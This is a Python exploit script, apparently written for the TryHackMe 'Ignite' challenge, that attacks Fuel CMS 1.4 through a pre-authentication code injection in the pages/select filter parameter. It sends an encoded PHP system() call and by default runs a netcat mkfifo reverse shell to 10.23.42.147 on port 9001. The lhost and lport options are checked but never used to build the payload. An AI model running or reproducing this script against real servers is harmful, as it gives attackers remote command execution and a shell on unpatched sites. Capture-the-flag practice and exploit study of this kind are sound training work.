#!/usr/bin/env python3

import requests
import urllib.parse
import argparse
import sys

# Color definitions
class Colors:
    GREEN = "\033[1;32m"
    RED = "\033[1;31m"
    BLUE = "\033[1;34m"
    YELLOW = "\033[1;33m"
    END = "\033[0m"

# Display banner function
def show_banner():
    banner = r"""
___________            .__  _________     _____    _________         ____        _____  
\_   _____/_ __   ____ |  | \_   ___ \   /     \  /   _____/        /_   |      /  |  | 
 |    __)|  |  \_/ __ \|  | /    \  \/  /  \ /  \ \_____  \   ______ |   |     /   |  |_
 |     \ |  |  /\  ___/|  |_\     \____/    Y    \/        \ /_____/ |   |    /    ^   /
 \___  / |____/  \___  >____/\______  /\____|__  /_______  /         |___| /\ \____   | 
     \/              \/             \/         \/        \/                \/      |__| 

        Author: l0n3m4n | Challenge: THM-Ignite | Vulnerability: Fuel CMS 1.4 - RCE
    """
    print(banner)

# URL encoding function
def urlencode(payload):
    return urllib.parse.quote(payload, safe="")

# Exploit function with better debugging
def exploit(target_url, raw_payload, lhost=None, lport=None):
    encoded_payload = urlencode(raw_payload)
    # If the payload is a reverse shell, construct the URL with the lhost and lport
    if lhost and lport:
        exploit_url = f"{target_url}/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{encoded_payload}%27%29%2b%27"
    else:
        # For non-reverse shell payloads, just use the target URL
        exploit_url = f"{target_url}/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{encoded_payload}%27%29%2b%27"

    try:
        response = requests.get(exploit_url)
        print(f"{Colors.YELLOW}[+] Response Status Code: {response.status_code}{Colors.END}")

        if response.status_code == 200:
            print(f"{Colors.GREEN}[+] Exploit executed successfully!{Colors.END}")
            print(f"{Colors.YELLOW}[+] Raw Response: {response.text[:500]}{Colors.END}")  # Print the first 500 characters for inspection
            parsed_response = (
                response.text.splitlines()[47:500]
                if len(response.text.splitlines()) > 47
                else response.text.splitlines()
            )
            for line in parsed_response:
                line = line.replace(">", "\n").strip()
                if line and not any(tag in line for tag in ("<p", "</p", "h4", "<div", "br", "</div")):
                    print(line)
        else:
            print(f"{Colors.RED}[-] Failed to execute the exploit. HTTP {response.status_code}.{Colors.END}")
    except requests.exceptions.RequestException as e:
        print(f"{Colors.RED}[-] An error occurred: {e}{Colors.END}")



# Argument parser
def parse_arguments():
    parser = argparse.ArgumentParser(
        description="FuelCMS 1.4 Pre-Auth Remote Code Execution Exploit",
           epilog=f"Exploit usage: python3 rce.py -u http://example.com -l 192.168.56.1 -P 9001"
    )
    parser.add_argument(
        "-u", "--url", required=True, help="Target URL (e.g., http://example.com)"
    )
    parser.add_argument(
        "-p",
        "--payload",
        default="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.23.42.147 9001 >/tmp/f",
        help="Reverse shell payload (default: Netcat reverse shell)",
    )
    parser.add_argument(
        "-l", "--lhost", help="Local IP address for reverse shell (optional)"
    )
    parser.add_argument(
        "-P", "--lport", help="Local port for reverse shell (optional)"
    )

    return parser.parse_args()


# Main function
def main():
    show_banner()
    args = parse_arguments()

    target_url = args.url
    raw_payload = args.payload
    lhost = args.lhost
    lport = args.lport

    # Check if a reverse shell payload is provided and ensure lhost and lport are specified
    if "nc" in raw_payload or "bash" in raw_payload:
        if not lhost or not lport:
            print(f"{Colors.RED}[-] Missing local host or port for reverse shell.{Colors.END}")
            sys.exit(1)

    if not target_url.startswith("http"):
        print(f"{Colors.RED}[-] Invalid URL format. Please include http:// or https://.{Colors.END}")
        sys.exit(1)

    # Pass lhost and lport to exploit if needed
    exploit(target_url, raw_payload, lhost, lport)


if __name__ == "__main__":
    main()
